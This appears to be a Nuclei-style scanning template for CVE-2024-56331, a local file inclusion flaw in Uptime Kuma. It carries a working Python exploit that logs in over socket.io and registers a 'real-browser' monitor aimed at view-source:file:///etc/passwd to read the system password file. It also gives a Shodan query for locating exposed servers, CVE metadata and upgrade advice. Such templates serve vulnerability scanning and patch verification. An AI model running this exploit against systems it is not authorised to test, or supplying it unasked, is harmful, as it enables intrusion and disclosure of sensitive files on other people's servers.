code:
- engine:
  - py
  - python3
  matchers:
  - type: word
    words:
    - '/etc/passwd: {''ok'': True, ''msg'': ''successAdded'''
  source: "import os\nimport time\n\ntry:\n  import socketio\nexcept ImportError:\n\
    \  raise ImportError(\"The 'socketio' library is not installed. Please install\
    \ it using 'pip install python-socketio'.\")\n\n# Load environment variables\n\
    USER = os.getenv('username')\nPASS = os.getenv('password')\nHOST = os.getenv('HOST')\n\
    PORT = os.getenv('PORT')\n\n# Configuration settings\nCONFIG = {\n    \"server_url\"\
    : f\"ws://{HOST}\",\n    \"credentials\": {\"username\": USER, \"password\": PASS},\n\
    \    \"request_types\": {\"real_browser\": \"real-browser\", \"http\": \"http\"\
    },\n    \"url_prefix\": {\"view_source\": \"view-source:file://\", \"file\": \"\
    file://\"}\n}\n\nTARGET_FILES = [\"/etc/passwd\"]\n\nclient = socketio.Client()\n\
    \ndef connect_to_server(url, retries=3, delay=2):\n    for attempt in range(retries):\n\
    \        try:\n            client.connect(url, wait_timeout=10)\n            print(f\"\
    [+] Connected to: {url}\")\n            return True\n        except Exception\
    \ as e:\n            print(f\"[!] Connection attempt {attempt + 1}/{retries} failed:\
    \ {e}\")\n            time.sleep(delay)\n    return False\n\ntry:\n    if not\
    \ connect_to_server(CONFIG[\"server_url\"]):\n        print(\"[!] Unable to connect\
    \ to the server. Exiting.\")\n        exit(1)\n\n    # Attempt login\n    login_resp\
    \ = client.call(\"login\", {\n        \"username\": CONFIG[\"credentials\"][\"\
    username\"],\n        \"password\": CONFIG[\"credentials\"][\"password\"]\n  \
    \  }, timeout=10)\n\n    if login_resp and login_resp.get(\"ok\"):\n        print(\"\
    [+] Login successful\")\n        # Process each sensitive file request\n     \
    \   for file_path in TARGET_FILES:\n            req_type = CONFIG[\"request_types\"\
    ][\"real_browser\"]\n            # Use view-source prefix in real-browser mode\n\
    \            url_prefix = CONFIG[\"url_prefix\"][\"view_source\"] if req_type\
    \ == CONFIG[\"request_types\"][\"real_browser\"] else CONFIG[\"url_prefix\"][\"\
    file\"]\n            target_url = f\"{url_prefix}{file_path}\"\n\n           \
    \ print(f\"[~] Sending {req_type} request for: {target_url}\")\n\n           \
    \ add_payload = {\n                \"type\": req_type,\n                \"name\"\
    : f\"{req_type} request for {file_path}\",\n                \"url\": target_url,\n\
    \                \"method\": \"GET\",\n                \"maxretries\": 0,\n  \
    \              \"timeout\": 500,\n                \"ignoreTls\": True,\n     \
    \           \"accepted_statuscodes\": [\"200-299\"],\n                \"conditions\"\
    : \"[]\"\n            }\n            response = client.call(\"add\", add_payload,\
    \ timeout=15)\n            print(f\"[+] Response for {file_path}: {response}\"\
    )\n    else:\n        print(\"[!] Login failed. Please check credentials.\")\n\
    except Exception as err:\n    print(f\"[!] An error occurred during execution:\
    \ {err}\")\nfinally:\n    client.disconnect()\n    print(\"[*] Disconnected from\
    \ the server\")\n"
id: CVE-2024-56331
info:
  author: hyni03
  classification:
    cve-id: CVE-2024-56331
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 6.8
    cwe-id: CWE-22
    epss-percentile: 0.97255
    epss-score: 0.41406
  description: 'Uptime Kuma has an Improper URL Handling vulnerability that can be
    exploited through the "real-browser" feature.

    By providing a URL using the file:/// protocol (e.g., file:///etc/passwd), an
    attacker can obtain a screenshot

    of local sensitive files, because the user input is not validated by the server.

    '
  impact: 'An authenticated user can exploit this vulnerability to access arbitrary
    local files by leveraging

    the "real-browser" feature, leading to potential information disclosure of sensitive
    system files.

    '
  metadata:
    product: uptime-kuma
    shodan-query: http.title:"Uptime Kuma"
    vendor: uptime-kuma
    verified: true
  name: Uptime-Kuma - Local File Inclusion (LFI)
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-56331
  - https://github.com/griisemine/CVE-2024-56331
  remediation: 'This vulnerability is fixed in version 1.23.16. Users are advised
    to upgrade to the latest version.

    '
  severity: critical
  tags: cve,cve2024,lfi,uptime-kuma,file-disclosure,vuln
variables:
  HOST: '{{Hostname}}'
  password: '{{password}}'
  username: '{{username}}'
